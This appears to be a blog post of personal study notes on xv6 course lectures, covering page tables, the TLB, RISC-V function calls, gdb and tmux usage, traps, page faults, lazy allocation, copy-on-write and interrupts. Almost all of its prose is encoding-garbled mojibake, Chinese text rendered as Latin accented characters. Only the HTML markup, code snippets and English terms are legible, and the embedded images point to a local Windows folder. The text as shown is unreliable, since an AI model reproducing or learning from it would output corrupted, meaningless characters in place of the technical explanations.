<p>xv6çš„é¡µè¡¨è®¾è®¡æ˜¯é‡‡ç”¨ä¸‰çº§é¡µè¡¨çš„ï¼Œä¸åƒx86çš„å››çº§é¡µè¡¨ï¼Œä¹‹æ‰€ä»¥é‡‡ç”¨ä¸‰çº§é¡µè¡¨ï¼Œæ˜¯å› ä¸ºä¸€ä¸ªé¡µè¡¨å ç”¨4k,æ¯ä¸€ä¸ªé¡µè¡¨é¡¹æ‰€å ç”¨çš„å†…å­˜æ˜¯2^3,æ‰€ä»¥ä¸€ä¸ªé¡µè¡¨å¯ä»¥æœ‰2^9ä¸ªé¡µè¡¨ï¼Œ27/9=3,æ‰€ä»¥ä¸‰ä¸ªé¡µè¡¨å°±å®Œå…¨å¤Ÿæ˜ å°„æ‰€æœ‰çš„ç´¢å¼•äº†ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220824152319391.png" alt="image-20220824152319391"></p>
<p>æ¯ä¸€ä¸ªé¡µè¡¨é¡¹æ˜¯64ä½å…¶ä¸­æœ€é«˜çš„10ä½å¹¶æ²¡æœ‰è¢«ä½¿ç”¨ï¼Œå› ä¸ºæ²¡å¿…è¦ï¼Œç„¶åå44ä½è®°å½•é¡µç¼–å·ï¼ˆå› ä¸ºä¸€å…±åªæœ‰2^44ä¸ªé¡µï¼‰ï¼Œç„¶åå10ä½è®°å½•ä¸€äº›æ ‡å¿—ï¼Œç”¨æ¥æ ‡è¯†è¿™ä¸ªé¡µè¡¨é¡¹ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220824153329033.png" alt="image-20220824153329033"></p>
<p><strong>TLB</strong></p>
<p>é‡‡ç”¨ä¸‰çº§é¡µè¡¨çš„è¯å¾—åˆ°ä¸€ä¸ªå…·ä½“çš„ç‰©ç†åœ°å€å°±éœ€è¦è®¿é—®è®¿é—®å†…å­˜ä¸‰æ¬¡ï¼Œè¿™æ˜¯éå¸¸æ˜‚è´µçš„ï¼Œæ‰€ä»¥å°±åƒx86æœ‰ç¼“å­˜ä¸€æ ·ï¼Œxv6ä¹Ÿæœ‰ç¼“å­˜ï¼Œä¹Ÿå«ä½œTLBï¼Œå‚¨å­˜ç€æœ€è¿‘è®¿é—®çš„è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€ä¹‹é—´çš„æ˜ å°„ã€‚</p>
<p>åœ¨xv6æ“ä½œç³»ç»Ÿä¸­ä¼¼ä¹è¿˜æ²¡æœ‰å®ç°å¤šä¸ªè¿›ç¨‹ä½¿ç”¨åŒä¸€ä¸ªTLB,æ‰€ä»¥å½“åˆ‡æ¢è¿›ç¨‹çš„æ—¶å€™ä¹Ÿéœ€è¦åˆ·æ–°TLBé˜²æ­¢æ˜ å°„å‡ºé”™ã€‚TLBè¿˜æ˜¯ä¸€ä¸ªç¡¬ä»¶ï¼Œå¹¶ä¸ç”±æ“ä½œç³»ç»Ÿå…·ä½“æ§åˆ¶ã€‚</p>
<p><strong>è™šæ‹Ÿåœ°å€åˆ†å¸ƒå’Œç‰©ç†åœ°å€åˆ†å¸ƒ</strong></p>
<p>ç‰©ç†å†…å­˜çš„åˆ†å¸ƒéƒ½æ˜¯æœ‰è®¾è®¡è€…æ§åˆ¶çš„ï¼Œå¹¶ä¸ç”±æ“ä½œç³»ç»Ÿæ§åˆ¶ï¼Œåœ¨ç‰©ç†å†…å­˜ä¸‹é¢çš„é‚£äº›ä½ç½®å¹¶ä¸æ˜¯çœŸå®å­˜åœ¨äºå†…å­˜ä¸­çš„ï¼Œè€Œæ˜¯ä¸€ç§æ˜ å°„ï¼Œæ¯”å¦‚ä¸­æ–­æˆ–è€…ioä»€ä¹ˆçš„ã€‚</p>
<p>ä¸ºäº†è®©xv6æ“ä½œç³»ç»Ÿèƒ½å¤Ÿæ¯”è¾ƒç®€å•ç®€çº¦ï¼Œè™šæ‹Ÿåœ°å€éƒ½æ˜¯é‡‡ç”¨æ’ç­‰æ˜ å°„çš„ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220824160019857.png" alt="image-20220824160019857"></p>
<p>ä¸Šé¢çš„è™šæ‹Ÿåœ°å€åˆ†å¸ƒä¼¼ä¹åªæ˜¯å†…æ ¸è™šæ‹Ÿåœ°å€åˆ†å¸ƒï¼Œå†…æ ¸ä¼šåœ¨<code>free memory</code>ä¸­ä¸ºè¿›ç¨‹åˆ†é…ç©ºé—´ï¼Œä¸‹é¢æ˜¯è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€åˆ†å¸ƒ</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220824164115781.png" alt="image-20220824164115781"></p>
<h4 id="Lecture5"><a href="#Lecture5" class="headerlink" title="Lecture5"></a><strong>Lecture5</strong></h4><p>æœ¬èŠ‚è¯¾ç¨‹ä¸»è¦æ˜¯è®²è§£<code>risc-v</code></p>
<p>åœ¨gdbä¸­è¾“å…¥<code>tui enable</code>å°±èƒ½è¿›å…¥ä¸€ä¸ªç•Œé¢ï¼Œåœ¨ç•Œé¢ä¸­è¾“å…¥<code>layout asm</code>æˆ–è€…<code>layout reg</code>ï¼Œ<code>layout src</code>å°±èƒ½æŸ¥çœ‹æ±‡ç¼–æˆ–è€…å¯„å­˜å™¨çš„å€¼æˆ–è€…æºä»£ç äº†ã€‚å¦‚æœæƒ³è¦èšç„¦æŸä¸ªçª—å£å°±å¯ä»¥è¾“å…¥<code>focus xxx</code></p>
<p>ç»ˆäºå­¦ä¼šäº†æ€ä¹ˆè‡ªåŠ¨å¼€å¤šä¸ªshellå¹³é“ºåˆ°æ¡Œé¢äº†ï¼Œé¦–å…ˆè¾“å…¥<code>tmux</code>,æ‰“å¼€ä¸€ä¸ªshell,åœ¨æ‰“å¼€ä¸€ä¸ªshellå°±æ˜¯å…ˆåŒæ—¶æŒ‰<code>ctrl+b</code>ç„¶åå•ç‹¬æŒ‰<code>c</code>,ç„¶åå¯ä»¥ä½¿ç”¨<code>ctrl+b</code>+p/næ¥åˆ‡æ¢shellçª—å£ï¼Œå¯ä»¥ä½¿ç”¨<code>ctrl b</code>+<code>shift+%</code>åˆ‡å‡ºæ–°çª—å£ï¼Œç„¶åä½¿ç”¨<code>ctrl+b</code>+oæ¥åˆ‡æ¢çª—å£ã€‚</p>
<p>ä½¿ç”¨<code>bt</code>å¯ä»¥æŸ¥çœ‹è°ƒç”¨æ ˆ</p>
<p>æ¡ä»¶æ–­ç‚¹å‘½ä»¤<code>b xxx if i==5</code></p>
<p>å¯„å­˜å™¨è¡¨</p>
<p>a0<del>a7å¯ä»¥å­˜æ”¾å‡½æ•°è°ƒç”¨å‚æ•°ï¼Œa0</del>a1å¯ä»¥å­˜æ”¾è¿”å›å€¼</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220901133841549.png" alt="image-20220901133841549"></p>
<h5 id="risc-vçš„å‡½æ•°è°ƒç”¨"><a href="#risc-vçš„å‡½æ•°è°ƒç”¨" class="headerlink" title="risc-vçš„å‡½æ•°è°ƒç”¨"></a>risc-vçš„å‡½æ•°è°ƒç”¨</h5><p>å’Œè®°å¿†ä¸­mipsçš„å‡½æ•°è°ƒç”¨å¾ˆç±»ä¼¼ï¼Œrisc-vä¸­æœ‰ä¸€ä¸ªå¯„å­˜å™¨ä¸“é—¨ç”¨æ¥è®°å½•è¿™ä¸ªå‡½æ•°çš„è¿”å›åœ°å€ï¼Œå½“æ‰§è¡Œ<code>ret</code>çš„å‡½æ•°ï¼Œå°±ä¼šæŠŠpcæŒ‡å‘<code>ra</code>å¯„å­˜å™¨ä¿å­˜çš„åœ°å€ï¼Œä½†æ˜¯raå¯„å­˜å™¨åªæœ‰ä¸€ä¸ªï¼Œä½†æ˜¯å‡½æ•°aå¯ä»¥è°ƒç”¨å‡½æ•°b,å½“æ‰§è¡Œå‡½æ•°bçš„æ—¶å€™ï¼Œraå¯„å­˜å™¨æŒ‡å‘å‡½æ•°bçš„è¿”å›å€¼ï¼Œä½†æ˜¯å‡½æ•°bä¹Ÿå¯ä»¥è°ƒç”¨å‡½æ•°c,å½“æ‰§è¡Œå‡½æ•°cçš„æ—¶å€™raä¿å­˜å‡½æ•°cçš„è¿”å›å€¼ï¼Œå½“è¿”å›åˆ°å‡½æ•°bçš„æ—¶å€™ï¼Œraè¿˜æ˜¯æŒ‡å‘äº†å‡½æ•°cçš„è¿”å›å€¼ï¼Œè¿™æ ·å°±ä¼šé€ æˆæ­»å¾ªç¯äº†ï¼Œæ‰€ä»¥risc-vå°±æœ‰ä¸€ä¸ªç­–ç•¥ï¼Œå½“æŒ‡å‘éå¶å­å‡½æ•°ï¼ˆä¹Ÿå°±æ˜¯è¿™ä¸ªå‡½æ•°è¿˜ä¼šè°ƒç”¨å…¶ä»–å‡½æ•°ï¼‰ï¼Œå°±ä¼šæŠŠraä¿å­˜åˆ°æ ˆé‡Œï¼Œå½“å‡½æ•°è¿”å›çš„æ—¶å€™å…ˆæŠŠæ ˆé‡Œçš„è¿”å›åœ°å€åŠ è½½åˆ°raä¸­å†æ‰§è¡Œ<code>ret</code>æŒ‡ä»¤ï¼Œå½“æ‰§è¡Œå¶å­å‡½æ•°çš„æ—¶å€™ï¼Œå°±ä¸ä¼šåœ¨æ ˆé‡Œä¿å­˜raå¯„å­˜å™¨äº†ï¼Œå½“æ‰§è¡Œ<code>ret</code>çš„æ—¶å€™ç›´æ¥åŠ è½½<code>ra</code>å¯„å­˜å™¨ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220901210847634.png" alt="image-20220901210847634"></p>
<h4 id="Lecture6"><a href="#Lecture6" class="headerlink" title="Lecture6"></a>Lecture6</h4><p>åœ¨å†…æ ¸æ€çš„æ—¶å€™æƒé™æå‡ä¸»è¦ä½“ç°åœ¨ä¸¤ç‚¹ï¼Œä¸€ç‚¹æ˜¯å¯ä»¥è¯»å†™æ§åˆ¶å¯„å­˜å™¨ï¼Œç¬¬äºŒç‚¹æ˜¯å¯ä»¥å¯ä»¥ä½¿ç”¨æ²¡æœ‰<code>pte_u</code>çš„é¡µè¡¨ã€‚</p>
<p>è¿™æ˜¯shç¨‹åºçš„é¡µè¡¨ï¼Œå¯ä»¥æ¸…æ™°çš„çœ‹è§è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€çš„æ˜ å°„ï¼Œæ¯”è¾ƒæœ‰æ”¶è·çš„å°±æ˜¯ï¼Œè®¾ç½®äº†uæƒé™çš„é¡µè¡¨ï¼Œç”¨æˆ·æ€æ‰å¯ä»¥ä½¿ç”¨ï¼Œå…¶æ¬¡æ˜¯é™·é˜±å¸§trapframeè™½ç„¶æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„ä¸€ä»½ï¼Œä½†æ˜¯æ‰€æœ‰è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€éƒ½æ˜¯ä¸€æ ·çš„<code>#define TRAPFRAME (TRAMPOLINE - PGSIZE)</code>ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220906160934534.png" alt="image-20220906160934534"></p>
<p>åœ¨æ‰§è¡Œ<code>ecall</code>çš„æ—¶å€™ä¼šå…³é—­ä¸­æ–­ï¼Œè¿™æ ·å°±ä¸ä¼šå‘ç”Ÿè¿›ç¨‹åˆ‡æ¢äº†ï¼Œç„¶ååœ¨æ‰§è¡Œ<code>sret</code>çš„æ—¶å€™åˆä¼šæ‰“å¼€ä¸­æ–­ï¼Œå¦‚æœä¸è¿›è¡Œå…¶ä»–æ“ä½œï¼Œå½“ç”¨æˆ·æ€ç¨‹åºé™·å…¥å†…æ ¸æ€çš„æ—¶å€™å¹¶ä¸ä¼šå‘ç”Ÿè¿›ç¨‹åˆ‡æ¢ï¼Œä½†æ˜¯è¿™æ ·åšå¹¶ä¸é€‚åˆæ‰€æœ‰æƒ…å†µï¼Œå½“è¿›è¡Œç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™å°±å¯ä»¥è¿›ç¨‹åˆ‡æ¢ï¼Œæ‰“å¼€ä¸­æ–­å’Œå…³é—­ä¸­æ–­çš„å‡½æ•°åˆ†åˆ«æ˜¯<code>intr_on()</code>å’Œ<code>intr_off()</code>ï¼Œå½“æ‰§è¡Œå®Œç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™åˆä¼šå…³é—­ä¸­æ–­ã€‚</p>
<h4 id="Lecture8"><a href="#Lecture8" class="headerlink" title="Lecture8"></a>Lecture8</h4><p><strong>é¡µé¢é”™è¯¯(page faults)</strong></p>
<p>å…¶å®å¯ä»¥åˆ©ç”¨é¡µé¢é”™è¯¯é…åˆè™šæ‹Ÿå†…å­˜æ¥å®Œæˆå¥½å¤šæœ‰æ„æ€çš„äº‹æƒ…ï¼Œæ¯”å¦‚è¯´forkçš„å†™æ—¶å¤åˆ¶æˆ–è€…æƒ°æ€§åˆ†é…ã€‚</p>
<p>åœ¨å‘ç”Ÿé¡µé¢é”™è¯¯æ—¶æˆ‘ä»¬å¯ä»¥çŸ¥é“ä¸‰ä¸ªä¿¡æ¯ï¼Œé¦–å…ˆæ˜¯é”™è¯¯åœ°å€ï¼Œå¾—çŸ¥é“é”™è¯¯åœ°å€æ‰èƒ½å»å¤„ç†ä»–ï¼Œè¿™ä¸ªé”™è¯¯åœ°å€å°±ä¿å­˜åœ¨<code>stval</code>å¯„å­˜å™¨ä¸­ï¼Œç¬¬äºŒç‚¹å°±æ˜¯å¾—çŸ¥é“é¡µé¢é”™è¯¯çš„ç±»å‹ï¼Œè¿™ä¸ªç±»å‹å°±å­˜å‚¨åœ¨<code>scause</code>å¯„å­˜å™¨ä¸­ã€‚ç¬¬ä¸‰ä»¶ç‚¹å¾—çŸ¥é“å¼•èµ·é¡µé¢é”™è¯¯çš„æŒ‡ä»¤çš„è™šæ‹Ÿåœ°å€ï¼Œè¿™ä¸ªåœ°å€å°±å­˜å‚¨åœ¨<code>sepc</code>ä¸­ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908204934721.png" alt="image-20220908204934721"></p>
<p><strong>æƒ°æ€§åˆ†é…</strong></p>
<p>æƒ°æ€§åˆ†é…å®é™…å°±æ˜¯ä¸€ä¸ªç©ºå¤´æ”¯ç¥¨ï¼Œå¹¶ä¸åˆ†é…ç‰©ç†å†…å­˜å’Œæ˜ å°„ï¼Œè€Œæ˜¯å…ˆå¢å¤§p-&gt;sz,å½“ä½¿ç”¨è¿™æ®µå†…å­˜çš„æ—¶å€™æ‰æ ¹æ®<code>scause</code>çš„å€¼ç¡®å®šé¡µé¢é”™è¯¯ç±»å‹ç„¶ååˆ†é…å†…å­˜å¹¶ä¸”æ˜ å°„ï¼Œæ‰€ä»¥åœ¨srbkä¸­å¹¶ä¸éœ€è¦æ˜ å°„ï¼Œè€Œæ˜¯å¢å¤§p-&gt;szçš„å€¼å°±å¯ä»¥äº†ï¼Œå¤§æ¦‚æ€è·¯å¦‚ä¸‹å›¾ä»£ç ï¼Œæ¯”è¾ƒå¥½ç†è§£</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908210855042.png" alt="image-20220908210855042"></p>
<p>ä½†æ˜¯è¿™æ ·åˆä¼šå¯¼è‡´å¦ä¸€ä¸ªé”™è¯¯ï¼Œå½“æƒ°æ€§åˆ†é…åï¼Œå¯èƒ½çš„æƒ…å†µå°±æ˜¯æœ‰äº›çœŸçš„åˆ†é…äº†ï¼Œæœ‰çš„æ²¡æœ‰åˆ†é…ï¼Œå½“é‡Šæ”¾è¿™ä¸ªè¿›ç¨‹çš„å†…å­˜çš„å°±æ˜¯åå°±ä¼šå‘ç”Ÿå¦‚ä¸‹bug</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908211459524.png" alt="image-20220908211459524"></p>
<p>ç®€å•çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯é‡Šæ”¾è¿›ç¨‹å†…å­˜çš„æ—¶å€™æ¡ä»¶æ”¾çš„å®½æ¾ä¸€ç‚¹ï¼ŒåŸæœ¬çš„uvnunmapæ˜¯å¦‚æœæ£€æµ‹åˆ°äº†ä¸å­˜åœ¨çš„æ˜ å°„ç›´æ¥<code>panic</code>,æˆ‘ä»¬å¯ä»¥ä¿®æ”¹æˆ<code>continue</code></p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908211750910.png" alt="image-20220908211750910"></p>
<p>å¾ˆç†Ÿæ‚‰çš„bssæ®µä¹Ÿå¯ä»¥åˆ©ç”¨æƒ°æ€§åˆ†é…ï¼Œç±»ä¼¼ä¸‹å›¾ï¼Œå…ˆè®©bsså…¨éƒ¨æ˜ å°„åˆ°ä¸€ä¸ªåªæœ‰è¯»æƒé™çš„é¡µé¢ï¼Œå½“æœ‰ä¸€ä¸ªåœ°å€æƒ³è¦å†™å…¥å†…å®¹çš„æ—¶å€™å°±ä¼šè§¦å‘é¡µé¢é”™è¯¯ï¼Œè¿›è€Œå¯ä»¥ç»™ä»–åˆ†é…ä¸€ä¸ªæ–°çš„é¡µé¢ã€‚<img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908213940714.png" alt="image-20220908213940714"></p>
<p><strong>COW</strong></p>
<p>copy on writeï¼Œä¹Ÿå°±æ˜¯forkçš„å†™æ—¶å¤åˆ¶æŠ€æœ¯ï¼Œå½“forkçš„æ—¶å€™ï¼ŒæŠŠçˆ¶å­è¿›ç¨‹éƒ½æ˜ å°„åˆ°åŸå…ˆçˆ¶è¿›ç¨‹çš„ç‰©ç†å†…å­˜ä¸Šï¼Œä½†æ˜¯ä»–ä»¬éƒ½æ˜¯<code>r</code>ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220908221824481.png" alt="image-20220908221824481"></p>
<p>ç„¶åå½“å­è¿›ç¨‹æƒ³è¦åœ¨è¿™æ®µå†…å­˜ä¸­å†™å…¥å†…å®¹æ—¶å°±ä¼šå‘ç”Ÿé¡µè¡¨é”™è¯¯ï¼Œç„¶åå¯ä»¥é‡æ–°ç”³è¯·ä¸€ä¸ªé¡µé¢ï¼ŒæŠŠå‘ç”Ÿé”™è¯¯çš„é¡µé¢çš„å†…å®¹å¤åˆ¶åˆ°æ–°ç”³è¯·çš„é¡µé¢ä¸Šï¼Œç„¶åæŠŠè¿™ä¸ªé¡µé¢æ˜ å°„åˆ°å­è¿›ç¨‹ä¸­ï¼ŒåŸå…ˆé”™è¯¯çš„è™šæ‹Ÿåœ°å€å°±æŒ‡å‘äº†è¿™ä¸ªæ–°çš„é¡µé¢ï¼Œç„¶åæŠŠçˆ¶è¿›ç¨‹çš„æƒé™å˜æˆ<code>rw</code>,ç„¶åé‡æ–°æ‰§è¡Œå‘ç”Ÿé¡µé¢é”™è¯¯çš„æŒ‡ä»¤ã€‚</p>
<p>ä½†æ˜¯å¦‚æœä½¿ç”¨å¾€ä¸€ä¸ªåªè¯»é¡µé¢ä¸­å†™å…¥å†…å®¹æ¥åˆ¤æ–­æ˜¯å¦æ˜¯å†™æ—¶å¤åˆ¶å…¶å®æ˜¯ä¸å‡†ç¡®çš„ï¼Œå› ä¸ºæœ‰äº›é¡µé¢æœ¬æ¥å°±æ˜¯åªè¯»å†…å®¹ï¼Œè¿™æ ·å°±ä¼šç ´åè¿™äº›é¡µé¢çš„å†…å®¹äº†ã€‚åœ¨pteä¸­è¿˜å­˜åœ¨ä¸€ä½å«åš<code>RSW</code>,å¯ä»¥æŠŠè¿™ä¸€ä½è®¾ç½®æˆæ˜¯å¦æ˜¯<code>cow</code>é¡µé¢çš„æ ‡å¿—ã€‚</p>
<p>ä¸Šè¿°çš„<code>cow</code>ç­–ç•¥å¹¶ä¸å®Œç¾ï¼Œå½“ä¸€ä¸ªçˆ¶è¿›ç¨‹forkäº†å¤šä¸ªå­è¿›ç¨‹ä¹‹åï¼Œçˆ¶è¿›ç¨‹exitçš„è¯æ˜¾ç„¶ä¸èƒ½ç›´æ¥é‡Šæ”¾çˆ¶è¿›ç¨‹çš„é¡µé¢ï¼Œå› ä¸ºæ‰€æœ‰å­è¿›ç¨‹éƒ½æŒ‡å‘è¿™äº›é¡µé¢ï¼Œæ‰€ä»¥å¾—ç»™æ¯ä¸ªé¡µé¢åŠ ä¸ªå¼•ç”¨è®¡æ•°ï¼Œå½“è®¡æ•°ä¸º0çš„æ—¶å€™æ‰ä¼šçœŸæ­£é‡Šæ”¾è¿™ä¸ªé¡µé¢ã€‚</p>
<p><strong>æŒ‰éœ€åˆ†é…</strong></p>
<p>æŒ‰éœ€åˆ†é…æ˜¯å†…å­˜æ‰©å±•çš„ç²¾é«“ï¼Œå½“åœ¨å†…å­˜ä¸­åŠ è½½æ–‡ä»¶æ—¶å¹¶ä¸æ˜¯å…¨éƒ¨éƒ½åŠ è½½è¿›å»ï¼Œè€Œæ˜¯æŒ‰éœ€åŠ è½½ï¼Œç„¶åå½“å†…å­˜ç”¨å®Œä¹‹åå†é©±é€ä¸€äº›è¿‘æœŸä¸ç”¨çš„é¡µé¢è…¾å‡ºç©ºé—´ã€‚</p>
<h4 id="Lecture9"><a href="#Lecture9" class="headerlink" title="Lecture9"></a>Lecture9</h4><h5 id="book-read"><a href="#book-read" class="headerlink" title="book read"></a>book read</h5><p>è¿™ä¸€èŠ‚æ˜¯å…³äºä¸­æ–­çš„ï¼Œä»¥å‰æ€»æ˜¯å¯¹ä¸­æ–­æ¨¡æ¨¡ç³Šç³Šçš„ï¼Œä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œé€šè¿‡é˜…è¯»æœ¬èŠ‚å†…å®¹å’Œç½‘ä¸Šçš„èµ„æ–™ï¼Œç»ˆäºå¯¹ä¸­æ–­æœ‰äº†ä¸€ä¸ªè¾ƒä¸ºæ¸…æ™°çš„æ¦‚å¿µäº†ã€‚</p>
<p>ä¸­æ–­å…¶å®å°±æ˜¯åœ¨CPUæ­£åœ¨åšæŸä»¶äº‹çš„æ—¶å€™ï¼Œæ”¶åˆ°äº†é€šçŸ¥å‘Šè¯‰CPUä½ è¦æ”¾ä¸‹æ‰‹å¤´ç°åœ¨åšçš„äº‹ï¼Œå»å¤„ç†å¦ä¸€ä»¶äº‹ï¼ˆå½“ç„¶è¿™ä¸ªæ˜¯ç«‹å³å¤„ç†è¿˜æ˜¯è¿‡ä¸€ä¼šå¤„ç†ä»¥åŠå¦‚ä½•å¤„ç†å–å†³äºä¸­æ–­çš„ç±»å‹ï¼‰ã€‚å¯ä»¥å…ˆæŠŠä¸­æ–­åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯å¤–éƒ¨ä¸­æ–­ï¼Œä¸€ç§æ˜¯å†…éƒ¨ä¸­æ–­ã€‚</p>
<p>å¤–éƒ¨ä¸­æ–­ä¹Ÿå«ç¡¬ä»¶ä¸­æ–­ï¼Œç”±ç¡¬ä»¶å‘cpuå‘å‡ºä¸­æ–­ä¿¡å·ï¼Œç„¶åcpuåœä¸‹æ¥å¤„ç†è¿™ä¸ªä¸­æ–­ï¼Œæ­¤æ—¶cpuæ˜¯çŸ¥é“æ˜¯é‚£ä¸ªè®¾å¤‡å‘å‡ºçš„ä¸­æ–­çš„ï¼Œæœ‰ä¸ªä¸­æ–­å·ï¼Œç„¶åæ ¹æ®è¿™ä¸ªä¸­æ–­å·è°ƒç”¨å¯¹åº”çš„ä¸­æ–­é©±åŠ¨ç¨‹åºå¯¹è¿™ä¸ªä¸­æ–­å®Œæˆå¤„ç†ï¼Œè¿™æ ·ä¸€çœ‹cpuå°±åƒä¸€ä¸ªåç«¯ä¸€æ ·ï¼Œæ ¹æ®è¯·æ±‚ä¿¡æ¯å¤„ç†å¯¹åº”äº‹ä»¶ã€‚</p>
<p>å†…éƒ¨ä¸­æ–­å°±æ˜¯æŒ‡cpuå†…éƒ¨å‡ºç°çš„ä¸­æ–­ï¼Œç³»ç»Ÿè°ƒç”¨å°±æ˜¯å†…éƒ¨ä¸­æ–­ã€‚</p>
<h5 id="è¯¾ç¨‹å†…å®¹"><a href="#è¯¾ç¨‹å†…å®¹" class="headerlink" title="è¯¾ç¨‹å†…å®¹"></a>è¯¾ç¨‹å†…å®¹</h5><p>å½“é€šä¸Šç”µä»¥åï¼Œè®¾å¤‡ä¹Ÿæ˜¯åœ¨è¿è¡Œçš„ï¼Œcpuä¹Ÿæ˜¯åœ¨è¿è¡Œçš„ï¼Œä¸¤ä¸ªå¯ä»¥è¯´æ˜¯åœ¨å¹¶è¡Œè¿è¡Œï¼Œæ—¢ç„¶æ˜¯åœ¨å¹¶è¡Œè¿è¡Œï¼Œå°±éœ€è¦å¤„ç†ä¸¤è€…ä¹‹é—´çš„åŒæ­¥æ€§é—®é¢˜ï¼Œè€Œä¸­æ–­å°±å¯ä»¥å¤„ç†è¿™ä¸ªé—®é¢˜ã€‚</p>
<p>PCLIæ˜¯cpuå†…éƒ¨çš„ä¸€ä¸ªæ¨¡å—ï¼Œæ˜¯å¯¹å¤–éƒ¨è®¾å¤‡ä¸­æ–­çš„ç®¡ç†è€…ï¼Œ</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220920231732880.png" alt="image-20220920231732880"></p>
<p>é©±åŠ¨ç¨‹åºåˆ†ä¸ºä¸Šä¸‹ä¸¤éƒ¨åˆ†ï¼Œä¸‹åŠéƒ¨åˆ†æ˜¯ä¸­æ–­å¤„ç†ç¨‹åºï¼Œä¸ŠåŠéƒ¨åˆ†åœ¨æˆ‘çœ‹æ¥æ˜¯ç¼“å­˜åŒºï¼Œæ¯”å¦‚<code>uart</code>è®¾å¤‡çš„å¯ä»¥æŠŠæ¥æ”¶æˆ–è€…å‘é€çš„å­—ç¬¦ä¸²æ”¾åœ¨ä¸ŠåŠéƒ¨åˆ†ï¼Œç„¶åå°±å¯ä»¥å®Œæˆäº†è®¾å¤‡å’Œcpuçš„è§£è€¦ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220920233006328.png" alt="image-20220920233006328"></p>
<p><code>$ ls</code>çš„å·¥ä½œè¿‡ç¨‹ï¼Œçœ‹çš„ä¸æ˜¯å¾ˆæ‡‚ï¼Œå…³äºuartçš„éƒ¨åˆ†ã€‚</p>
<p>åç»­,ç¨å¾®ç†è§£äº†uartï¼Œä»–æ˜¯ä¸€ä¸ªç”¨äºè¾…åŠ©è®¡ç®—æœºå’Œè®¾å¤‡é€šä¿¡çš„èŠ¯ç‰‡ï¼Œå½“è®¡ç®—æœºå‘è®¾å¤‡å‘é€æ•°æ®çš„æ—¶å€™ï¼Œé€šè¿‡uartä¸²å£æŠŠå­—èŠ‚è½¬æ¢æˆä¸€ä½ä¸€ä½çš„ï¼Œç„¶åè®¾å¤‡æŠŠä¸€ä½ä¸€ä½çš„æ•°æ®ä¼ é€’ç»™è®¡ç®—æœºçš„æ—¶å€™ï¼Œé€šè¿‡uartä¸²å£æŠŠä¸€ä½ä¸€ä½çš„æ•°æ®è½¬åŒ–æˆå­—èŠ‚æµä¼ é€’ç»™è®¡ç®—æœºã€‚</p>
<p>æ‰“å°<code>$</code>çš„æµç¨‹å°±æ˜¯å…ˆæŠŠ<code>$</code>æ”¾å…¥åˆ°uartçš„ä¸€ä¸ªå¯„å­˜å™¨ä¸­ï¼Œç„¶åäº§ç”Ÿä¸€ä¸ªä¸­æ–­ï¼ŒæŠŠå‚¨å­˜çš„å­—ç¬¦å‘é€åˆ°å¦ä¸€ä¸ªuartä¸­ï¼Œè¿™ä¸ªuarté“¾æ¥åˆ°äº†è™šæ‹Ÿæ§åˆ¶å°ã€‚</p>
<p>å‘é€<code>ls</code>æ—¶ï¼Œé¦–å…ˆé”®ç›˜ä¼šæŠŠå­—ç¬¦å‘é€åˆ°ä¸ä¹‹é“¾æ¥çš„uartä¸Šï¼Œç„¶åuartå‘é€æ•°æ®åˆ°å¦ä¸€ä¸ªuartä¸Šï¼Œè¿™ä¸ªuartæ‹¿åˆ°æ•°æ®åå°±ä¼šäº§ç”Ÿä¸€ä¸ªä¸­æ–­ï¼Œå‘Šè¯‰è®¡ç®—å™¨é”®ç›˜è¾“å‡ºäº†å­—ç¬¦ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220921001534980.png" alt="image-20220921001534980"></p>
<p>å½“ä¸­æ–­è¦è¢«æŸä¸€ä¸ªcpuå¤„ç†çš„æ—¶å€™ï¼Œè¿™ä¸ªcpuå¯¹åº”å¯„å­˜å™¨çš„å˜åŒ–å¦‚ä¸‹</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20221005194949276.png" alt="image-20221005194949276"></p>
<p>ä¸­æ–­æœ‰ç‚¹éš¾ç†è§£ï¼Œè¯¾ä¸Šçš„å†…å®¹åŠæ‡‚ä¸æ‡‚çš„ï¼Œæœ‰æ—¶é—´çœ‹çœ‹æºç å†ç†è§£ä¸€ä¸‹å§ã€‚</p>
<h4 id="Lecture10"><a href="#Lecture10" class="headerlink" title="Lecture10"></a>Lecture10</h4><p>è¿™èŠ‚è¯¾çš„ä¸»è¦å†…å®¹æ˜¯é”</p>
